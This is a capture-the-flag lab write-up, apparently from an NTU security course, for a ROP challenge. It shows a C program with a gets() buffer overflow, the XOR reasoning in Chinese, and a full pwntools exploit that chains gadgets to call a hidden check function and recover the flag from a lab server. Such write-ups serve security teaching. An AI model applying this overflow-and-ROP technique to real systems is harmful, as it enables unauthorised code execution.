---
title: Simple PWN 0x33(2023 Lab - ROP_RW)
tags: [eductf, CTF, PWN]

category: "Security Course｜NTU CS｜PWN"
date: 2024-01-31
---

# Simple PWN 0x33(2023 Lab - ROP_RW)
<!-- more -->

## Background
ROP chain

## Source code
:::spoiler Source Code
```cpp
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>

char flag[0x10];
long secret;
char empty_buf[0x30];

void check(char *input)
{
	char pass[0x10];
	char output[0x10];
	for (int i = 0; i < 2; ++i)
	{
		((long *)pass)[i] = ((long *)input)[i] ^ secret;
	}
	if (strcmp(pass, "kyoumokawaii") == 0)
	{
		for (int i = 0; i < 2; ++i)
			((long *)output)[i] = ((long *)flag)[i] ^ ((long *)pass)[i];
	}
	printf("flag = %s\n", output);
}

int main(void)
{
	setvbuf(stdin, 0, _IONBF, 0);
	setvbuf(stdout, 0, _IONBF, 0);
	int fd = 0;
	char buf[0x10];
	fd = open("/home/chal/flag.txt", O_RDONLY);
	read(fd, flag, 0x10);
	close(fd);

	fd = open("/dev/urandom", O_RDONLY);
	read(fd, &secret, sizeof(secret));
	for (int i = 0; i < 2; ++i)
		((long *)flag)[i] = ((long *)flag)[i] ^ secret;

	printf("secret = %lx\n", secret);
	printf("> ");
	gets(buf);

	return 0;
}

```
:::

## Recon
先看這個程式的行為，在main當中，他會打開flag.txt和urandom這兩個file，然後做兩者的XOR，並且回傳urandom的內容給我們，並且有BOF的漏洞存在
:::info
flag和secret這兩個變數都是global variable
:::
而check這個function的功能是我們可以輸入一個input，他會和secret做XOR，若結果等於==kyoumokawaii==就把前面加密過的flag再跟`kyoumokawaii`做XOR並回傳給我們

思路很簡單:
雖然整隻程式都沒有呼叫到check function，但如果我們拿到secret，又可以進到check，是否可以做一些操作拿到flag
一開始一定會做的事情是把flag加密
$$
cipher= flag \oplus secret\\
$$
如果可以進到check function
$$
input\leftarrow kyoumokawaii\oplus secret
$$
$$
output\leftarrow cipher\oplus kyoumokawaii=flag\oplus secret\oplus kyoumokawaii
$$
$$
flag = output\oplus secret\oplus kyoumokawaii
$$
此時`output`, `secret`都已知，我們反推出flag為何，但重點是要怎麼呼叫到check function?==ROP chain + BOF==

1. 先利用該隻binary的gadget蓋成我們需要的chain，並且隨便找一個區間是不太會寫入的bss section address
    ```
    check_fn_addr = 0x4017ba
    bss_section = 0x4c7f00
    pop_rdx_rbx_ret = 0x0000000000485e8b
    mov_qword_ptr_rdi_rdx_ret = 0x00000000004337e3
    pop_rdi_ret = 0x00000000004020af
    ...
    rop_chain = flat(
    pop_rdi_ret,        bss_section,
    pop_rdx_rbx_ret,    input_1,        0,
    mov_qword_ptr_rdi_rdx_ret,
    pop_rdi_ret,        bss_section + 0x8,
    pop_rdx_rbx_ret,    input_2,        0,
    mov_qword_ptr_rdi_rdx_ret,
    pop_rdi_ret,        bss_section,
    check_fn_addr
    )
    ```
2. 等到跳到check function後就可以開始接return output，並按照上面的公式回推flag

## Exploit - ROP + BOF
```python
from pwn import *
from Crypto.Util.number import bytes_to_long, long_to_bytes

# r = process('./chal')
r = remote('10.113.184.121', 10051)
context.arch = 'amd64'

r.recvuntil(b'secret = ')
secret = int(r.recvline().strip().decode(), 16)
log.info(f'secret = {hex(secret)}')

check_fn_addr = 0x4017ba
bss_section = 0x4c7f00
pop_rdx_rbx_ret = 0x0000000000485e8b
mov_qword_ptr_rdi_rdx_ret = 0x00000000004337e3
pop_rdi_ret = 0x00000000004020af

input_1 = u64(b'kyoumoka') ^ secret
input_2 = u64(b'waii\x00\x00\x00\x00') ^ secret
log.info(f'input_1 = {hex(input_1)}, input_2 = {hex(input_2)}')

rop_chain = flat(
    pop_rdi_ret,        bss_section,
    pop_rdx_rbx_ret,    input_1,        0,
    mov_qword_ptr_rdi_rdx_ret,
    pop_rdi_ret,        bss_section + 0x8,
    pop_rdx_rbx_ret,    input_2,        0,
    mov_qword_ptr_rdi_rdx_ret,
    pop_rdi_ret,        bss_section,
    check_fn_addr
)
# raw_input()
r.sendlineafter(b'> ', b'a' * 40 + rop_chain)
r.recvuntil(b'flag = ')
output = r.recvline().strip()
log.info(f'output = {output}')
log.info(f'Part 1 = {hex(u64(output[0:8]))}, Part 2 = {hex(u64(output[8:16]))}')
flag_1 = p64(u64(output[0:8]) ^ input_1)
flag_2 = p64(u64(output[8:16]) ^ input_2)
log.info(f'flag = {(flag_1 + flag_2).strip().decode()}')

r.interactive()
```